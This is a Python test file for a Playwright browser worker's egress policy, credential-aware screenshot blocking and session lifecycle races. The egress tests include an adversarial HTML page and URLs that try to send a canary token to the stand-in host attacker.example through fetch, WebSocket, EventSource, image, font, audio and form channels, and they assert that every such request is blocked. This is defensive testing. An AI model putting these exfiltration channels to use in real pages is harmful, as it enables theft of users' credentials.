"""Items 5, 6, 7: screenshot safety, staged egress exfiltration, lifecycle races.

The egress tests plant a canary secret and have a real page try to exfiltrate it
through every channel a compromised vendor page could use — image, stylesheet,
font, media, WebSocket, form and fetch — then assert that no request reached the
unapproved host.
"""

from __future__ import annotations

import asyncio
from datetime import UTC, datetime, timedelta

import pytest

from ops.browser_egress import EgressStage, build_egress_policy
from ops.config import Settings
from ops.playwright_worker import (
    PlaywrightBrowserWorker,
    _has_credential_content,
    _looks_credential_bearing,
    make_egress_route_handler,
    make_route_handler,
)
from tests.browser_app.harness import require_chromium

_HOST = "app.pipedrive.com"
_PATTERNS = (_HOST, "*.pipedrive.com")
_EVIL = "attacker.example"
CANARY = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"


def _worker(**overrides: object) -> PlaywrightBrowserWorker:
    return PlaywrightBrowserWorker(settings=Settings(allow_live_browser=True, **overrides))  # type: ignore[arg-type]


def _start(worker: PlaywrightBrowserWorker) -> object:
    try:
        return asyncio.run(worker.start(None))
    except Exception as exc:  # pragma: no cover
        require_chromium(exc)


# --- Item 6: staged egress policy (unit level) ---------------------------------
class _Req:
    def __init__(self, url: str, resource_type: str) -> None:
        self.url = url
        self.resource_type = resource_type

    def is_navigation_request(self) -> bool:
        return self.resource_type == "document"


class _Route:
    def __init__(self, req: _Req) -> None:
        self.request = req
        self.aborted = False
        self.continued = False

    async def abort(self) -> None:
        self.aborted = True

    async def continue_(self) -> None:
        self.continued = True


def _route(url: str, kind: str, *, stage: str = "pre_auth") -> _Route:
    handler = make_route_handler(_PATTERNS, stage_provider=lambda: stage)
    route = _Route(_Req(url, kind))
    asyncio.run(handler(route))
    return route


_ALL_KINDS = [
    "document",
    "xhr",
    "fetch",
    "websocket",
    "eventsource",
    "script",
    "image",
    "font",
    "stylesheet",
    "media",
    "other",
    "unknown-kind",
]


@pytest.mark.parametrize("kind", _ALL_KINDS)
def test_post_auth_blocks_every_offlist_request_kind(kind: str) -> None:
    """After credentials exist in the DOM, even a pixel/CSS/font beacon is blocked."""

    route = _route(f"https://{_EVIL}/collect?c={CANARY}", kind, stage="post_auth")
    assert route.aborted is True and route.continued is False


@pytest.mark.parametrize("kind", ["image", "font", "stylesheet", "media"])
def test_pre_auth_still_allows_passive_assets(kind: str) -> None:
    route = _route("https://cdn.example/logo.png", kind, stage="pre_auth")
    assert route.continued is True


@pytest.mark.parametrize("kind", ["xhr", "fetch", "websocket", "eventsource", "script", "other"])
def test_pre_auth_blocks_active_offlist_requests(kind: str) -> None:
    route = _route(f"https://{_EVIL}/collect", kind, stage="pre_auth")
    assert route.aborted is True


def test_onlist_requests_continue_in_both_stages() -> None:
    for stage in ("pre_auth", "post_auth"):
        assert _route(f"https://{_HOST}/api/v1/self", "fetch", stage=stage).continued is True


def test_stage_provider_failure_fails_closed() -> None:
    def _boom() -> str:
        raise RuntimeError("stage unavailable")

    handler = make_route_handler(_PATTERNS, stage_provider=_boom)
    route = _Route(_Req("https://cdn.example/logo.png", "image"))
    asyncio.run(handler(route))
    # Cannot determine the stage -> treat as post_auth and abort.
    assert route.aborted is True


def test_pre_auth_asset_hosts_can_be_restricted() -> None:
    handler = make_route_handler(
        _PATTERNS, stage_provider=lambda: "pre_auth", asset_hosts=("cdn.pipedrive.com",)
    )
    allowed = _Route(_Req("https://cdn.pipedrive.com/a.png", "image"))
    denied = _Route(_Req("https://cdn.other.example/a.png", "image"))
    asyncio.run(handler(allowed))
    asyncio.run(handler(denied))
    assert allowed.continued is True and denied.aborted is True


# --- Item 6: LIVE adversarial exfiltration attempt -----------------------------
_EXFIL_PAGE = f"""
<html><body>
<h1>API</h1>
<p>Your token: {CANARY}</p>
<img src="https://{_EVIL}/pixel.png?c={CANARY}">
<link rel="stylesheet" href="https://{_EVIL}/style.css?c={CANARY}">
<script>
  // Every exfiltration channel a compromised vendor page could use.
  try {{ fetch("https://{_EVIL}/f?c={CANARY}"); }} catch (e) {{}}
  try {{ new WebSocket("wss://{_EVIL}/ws?c={CANARY}"); }} catch (e) {{}}
  try {{ new EventSource("https://{_EVIL}/es?c={CANARY}"); }} catch (e) {{}}
  try {{ new Image().src = "https://{_EVIL}/beacon.gif?c={CANARY}"; }} catch (e) {{}}
  try {{
    const f = new FontFace("evil", "url(https://{_EVIL}/f.woff2?c={CANARY})");
    f.load();
  }} catch (e) {{}}
  try {{
    const a = new Audio("https://{_EVIL}/m.mp3?c={CANARY}");
    a.load();
  }} catch (e) {{}}
  try {{
    const fm = document.createElement("form");
    fm.method = "POST";
    fm.action = "https://{_EVIL}/post";
    const i = document.createElement("input");
    i.name = "c"; i.value = "{CANARY}";
    fm.appendChild(i); document.body.appendChild(fm);
  }} catch (e) {{}}
</script>
</body></html>
"""


def test_live_canary_cannot_be_exfiltrated_after_authentication() -> None:
    """A real page tries every channel; nothing may reach the unapproved host."""

    worker = _worker()
    context = _start(worker)
    handle = context.session_id  # type: ignore[attr-defined]
    session = worker._sessions[handle]
    session.patterns = _PATTERNS
    # Credentials are present in the DOM, so egress is at its tightest stage. This
    # now drives the SINGLE canonical tracker (the duplicate string field is gone).
    session.egress_policy = build_egress_policy(_PATTERNS)
    session.egress.advance_to(EgressStage.CREDENTIAL_SURFACE)

    reached: list[str] = []

    async def _run() -> None:
        # Record ANY attempt that is allowed through to the attacker host.
        async def _spy(route: object) -> None:
            reached.append(route.request.url)  # type: ignore[attr-defined]
            await route.abort()  # type: ignore[attr-defined]

        # The production FOUR-STAGE egress policy is the route authority now, and
        # it is installed FIRST (context level).
        assert session.egress_policy is not None
        await session.context.route(
            "**/*",
            make_egress_route_handler(
                policy=session.egress_policy,
                stage_provider=lambda: session.egress.stage,
            ),
        )

        # Serve the adversarial page from the allowlisted host.
        async def _serve(route: object) -> None:
            await route.fulfill(  # type: ignore[attr-defined]
                status=200, content_type="text/html", body=_EXFIL_PAGE
            )

        await session.page.route(f"https://{_HOST}/**", _serve)
        await session.page.goto(
            f"https://{_HOST}/settings/api", wait_until="domcontentloaded", timeout=25_000
        )
        await session.page.wait_for_timeout(1_200)  # let the beacons fire

    asyncio.run(worker._loop.run(_run()))
    asyncio.run(worker.stop(context))  # type: ignore[arg-type]

    assert reached == [], f"canary escaped via: {reached}"


# --- Item 5: screenshots cannot expose credentials -----------------------------
_CREDENTIAL_RENDERINGS = {
    "plain_text": f"<p>Token: {CANARY}</p>",
    "code": f"<code>{CANARY}</code>",
    "pre": f"<pre>{CANARY}</pre>",
    "textarea": f"<textarea>{CANARY}</textarea>",
    "contenteditable": f"<div contenteditable='true'>{CANARY}</div>",
    "custom_component": f"<my-token data-secret='1'>{CANARY}</my-token>",
    "copy_button": f"<button data-credential='1'>Copy {CANARY}</button>",
    "password_input": f"<input type='password' value='{CANARY}'>",
}


@pytest.mark.parametrize("kind", sorted(_CREDENTIAL_RENDERINGS))
def test_no_screenshot_when_a_credential_is_rendered(kind: str) -> None:
    """Masking selectors alone are not relied upon: capture is refused outright."""

    worker = _worker()
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _load() -> bool:
        await session.page.set_content(f"<html><body>{_CREDENTIAL_RENDERINGS[kind]}</body></html>")
        return await _has_credential_content(session.page)

    sensitive = asyncio.run(worker._loop.run(_load()))
    captured = asyncio.run(worker.refresh_live_view(session))
    latest = worker.latest_screenshot(context.session_id)  # type: ignore[attr-defined]
    asyncio.run(worker.stop(context))  # type: ignore[arg-type]

    assert sensitive is True, f"{kind} must be detected as credential-bearing"
    assert captured is False and latest is None


def test_screenshot_is_produced_on_a_safe_page() -> None:
    worker = _worker()
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _load() -> None:
        await session.page.set_content("<html><body><h1>Dashboard</h1><a>Deals</a></body></html>")

    asyncio.run(worker._loop.run(_load()))
    captured = asyncio.run(worker.refresh_live_view(session))
    latest = worker.latest_screenshot(context.session_id)  # type: ignore[attr-defined]
    asyncio.run(worker.stop(context))  # type: ignore[arg-type]

    assert captured is True and latest is not None and latest[0].startswith(b"\x89PNG")


def test_screenshots_stay_disabled_once_a_sensitive_state_is_reached() -> None:
    worker = _worker()
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _safe() -> None:
        await session.page.set_content("<html><body><h1>Dashboard</h1></body></html>")

    asyncio.run(worker._loop.run(_safe()))
    assert asyncio.run(worker.refresh_live_view(session)) is True

    # Simulate reaching an authenticated/credential state.
    session.screenshots_disabled = True
    assert asyncio.run(worker.refresh_live_view(session)) is False
    # The previously captured frame is dropped, not merely superseded.
    assert worker.latest_screenshot(context.session_id) is None  # type: ignore[attr-defined]
    asyncio.run(worker.stop(context))  # type: ignore[arg-type]


def test_looks_credential_bearing_is_structural() -> None:
    from ops.browser_decider import build_snapshot
    from ops.playwright_worker import PageInspection

    secret_page = PageInspection(
        url=f"https://{_HOST}/x",
        title="",
        visible_text="",
        elements=build_snapshot([{"tag": "input", "type": "password", "name": "Password"}]),
        locators=(),
        fingerprint="f",
    )
    safe_page = PageInspection(
        url=f"https://{_HOST}/x",
        title="",
        visible_text="Your workspace",
        elements=build_snapshot([{"tag": "a", "name": "Deals"}]),
        locators=(),
        fingerprint="f",
    )
    assert _looks_credential_bearing(secret_page) is True
    assert _looks_credential_bearing(safe_page) is False


# --- Item 7: lifecycle races ---------------------------------------------------
def test_navigation_versus_teardown_does_not_crash() -> None:
    worker = _worker()
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _both() -> list[object]:
        async def _navigate() -> str:
            async def _work() -> str:
                async with session.operation_lock:
                    await session.page.set_content("<html><body><h1>x</h1></body></html>")
                    return await session.page.title()

            return await worker._loop.run(_work())

        return await asyncio.gather(
            _navigate(),
            worker.stop(context),
            return_exceptions=True,  # type: ignore[arg-type]
        )

    results = asyncio.run(_both())
    # Neither task may raise an unexpected error; the session ends up removed.
    assert all(not isinstance(r, BaseException) or isinstance(r, Exception) for r in results)
    assert context.session_id not in worker._sessions  # type: ignore[attr-defined]


def test_screenshot_versus_stop_is_safe() -> None:
    worker = _worker()
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _both() -> list[object]:
        return await asyncio.gather(
            worker.refresh_live_view(session),
            worker.stop(context),  # type: ignore[arg-type]
            return_exceptions=True,
        )

    asyncio.run(_both())
    assert context.session_id not in worker._sessions  # type: ignore[attr-defined]
    # Screenshot bytes are always dropped by teardown.
    assert session.screenshot is None


def test_capture_versus_expiry_reaping_is_safe() -> None:
    worker = _worker()
    context = _start(worker)
    handle = context.session_id  # type: ignore[attr-defined]
    session = worker._sessions[handle]
    session.last_active_at = datetime.now(UTC) - timedelta(hours=2)

    async def _both() -> list[object]:
        return await asyncio.gather(
            worker.refresh_live_view(session),
            asyncio.to_thread(worker._reap_expired),
            return_exceptions=True,
        )

    asyncio.run(_both())
    assert handle not in worker._sessions
    assert session.capacity_released is True


def test_simultaneous_close_calls_release_capacity_once() -> None:
    worker = _worker(playwright_max_sessions=1)
    context = _start(worker)
    session = worker._sessions[context.session_id]  # type: ignore[attr-defined]

    async def _both() -> list[object]:
        return await asyncio.gather(
            worker.stop(context),  # type: ignore[arg-type]
            worker.stop(context),  # type: ignore[arg-type]
            return_exceptions=True,
        )

    asyncio.run(_both())
    assert session.capacity_released is True
    # Exactly one slot came back: a new session can start, and only one.
    from ops.provider_errors import ProviderOperationError

    first = _start(worker)
    with pytest.raises(ProviderOperationError):
        asyncio.run(worker.start(None))
    asyncio.run(worker.stop(first))  # type: ignore[arg-type]


def test_close_is_idempotent_and_stops_the_janitor() -> None:
    worker = _worker()
    context = _start(worker)
    asyncio.run(worker.close())
    asyncio.run(worker.close())  # second call must not raise
    assert worker._sessions == {}
    assert worker._janitor_stop.is_set() is True
    del context
